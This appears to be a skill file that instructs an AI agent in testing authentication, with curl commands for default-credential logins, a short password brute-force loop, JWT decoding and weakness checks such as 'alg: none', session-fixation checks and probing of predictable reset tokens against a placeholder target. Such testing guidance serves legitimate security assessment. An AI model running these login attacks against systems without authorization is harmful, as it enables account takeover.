---
name: noir-broken-auth
description: "Authentication and session management testing. Use when testing login, registration, password reset, session tokens, or JWT handling. Trigger keywords: auth, authentication, login, session, jwt, token, password, oauth, saml."
---

# Broken Authentication Testing

## Goal
Identify weaknesses in authentication mechanisms, session management, and token handling.

## Steps

### 1. Credential Testing

Test for common weak credentials:

```bash
curl -s -X POST "https://target.com/login" -d "username=admin&password=admin"
curl -s -X POST "https://target.com/login" -d "username=admin&password=password"
curl -s -X POST "https://target.com/login" -d "username=admin&password=123456"
```

### 2. No Rate Limiting

Send rapid login attempts and check if the endpoint returns 200 for any:

```bash
for pw in admin password 123456 letmein root; do
  curl -s -o /dev/null -w "%{http_code}" -X POST "https://target.com/login" -d "username=admin&password=$pw"
  echo " -> $pw"
done
```

### 3. JWT Weaknesses

Extract and inspect JWT tokens:

```bash
# Decode JWT header and payload
echo "<jwt>" | cut -d. -f2 | base64 -d 2>/dev/null || true
```

Check for:
- `alg: none` — algorithm none attack
- Weak secret — try common secrets: `secret`, `jwt_secret`, `key`
- Missing expiration (`exp`) claim
- Excessive token lifetime

### 4. Session Fixation

Check if the session token is regenerated after login:

```bash
# Get pre-auth session cookie
curl -s -c /tmp/cookies.txt "https://target.com/login"
# Login with credentials
curl -s -b /tmp/cookies.txt -c /tmp/cookies2.txt -X POST "https://target.com/login" -d "username=test&password=test"
# Compare session IDs — if unchanged, vulnerable to fixation
```

### 5. Password Reset Abuse

```bash
# Check if reset tokens are predictable
curl -s "https://target.com/reset?token=1"
curl -s "https://target.com/reset?token=2"
```

## Output

Log: endpoint, vulnerability type, payload/technique, evidence.
